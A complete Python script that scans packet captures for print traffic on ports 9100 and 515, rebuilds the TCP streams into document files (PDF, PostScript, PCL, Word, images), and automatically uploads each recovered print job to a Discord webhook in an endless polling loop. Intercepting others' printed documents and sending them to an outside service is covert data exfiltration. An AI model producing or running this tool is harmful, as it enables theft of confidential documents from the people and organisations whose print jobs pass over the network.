import collections
import os
import requests
import time
import glob
from scapy.layers.inet import IP, TCP
from scapy.utils import PcapReader

DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
OUTDIR = r"C:\Users\User\Downloads\extracted_print_jobs"
PCAPS_PARENT_DIR = r"C:\Users\User\Downloads\Network_Project"
MAX_FILE_SIZE = 24 * 1024 * 1024 

os.makedirs(OUTDIR, exist_ok=True)

class DiscordUploader:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url

    def upload_file(self, file_path):
        if not os.path.exists(file_path):
            return False
        file_size = os.path.getsize(file_path)
        if file_size > MAX_FILE_SIZE:
            return False
        file_name = os.path.basename(file_path)
        try:
            with open(file_path, "rb") as f:
                files = {"file": (file_name, f)}
                payload = {"content": f"New print job extracted: `{file_name}`"}
                response = requests.post(self.webhook_url, data=payload, files=files)
                return response.status_code in [200, 204]
        except Exception:
            return False

class Recapper:
    def __init__(self, fname):
        self.fname = fname
        self.sessions = collections.defaultdict(list)

    def get_sessions(self):
        try:
            with PcapReader(self.fname) as reader:
                for pkt in reader:
                    if IP in pkt and TCP in pkt and pkt[TCP].payload:
                        if pkt[TCP].dport in [9100, 515] or pkt[TCP].sport in [9100, 515]:
                            ident = tuple(sorted((
                                pkt[IP].src, pkt[TCP].sport,
                                pkt[IP].dst, pkt[TCP].dport,
                            )))
                            self.sessions[ident].append(pkt)
        except Exception:
            pass
        return self.sessions

    def write_jobs(self):
        extracted_files = []
        for count, (ident, packets) in enumerate(self.sessions.items()):
            packets.sort(key=lambda p: p[TCP].seq)
            raw_payload = b"".join(bytes(p[TCP].payload) for p in packets)
            if not raw_payload:
                continue

            ext = "bin"
            if raw_payload.startswith(b"%PDF"): ext = "pdf"
            elif b"%!PS" in raw_payload: ext = "ps"
            elif b"\x1b%-12345X" in raw_payload or b"\x1bE" in raw_payload: ext = "pcl"
            elif raw_payload.startswith(b"PK\x03\x04"): ext = "docx"
            elif raw_payload.startswith(b"\xd0\xcf\x11\xe0"): ext = "doc"
            elif raw_payload.startswith(b"\xff\xd8\xff"): ext = "jpg"
            elif raw_payload.startswith(b"\x89PNG\r\n\x1a\n"): ext = "png"

            fname = f"extracted_{int(time.time())}_{count}.{ext}"
            path = os.path.join(OUTDIR, fname)
            with open(path, "wb") as f:
                f.write(raw_payload)
            extracted_files.append(path)
        return extracted_files

def main():
    processed_files = set()
    uploader = DiscordUploader(DISCORD_WEBHOOK_URL)
    
    while True:
        pcap_files = glob.glob(os.path.join(PCAPS_PARENT_DIR, "**", "*.pcap"), recursive=True)
        for pfile in pcap_files:
            if pfile not in processed_files:
                time.sleep(2)
                recap = Recapper(pfile)
                recap.get_sessions()
                jobs = recap.write_jobs()
                for job in jobs:
                    uploader.upload_file(job)
                processed_files.add(pfile)
        time.sleep(5)

if __name__ == "__main__":
    main()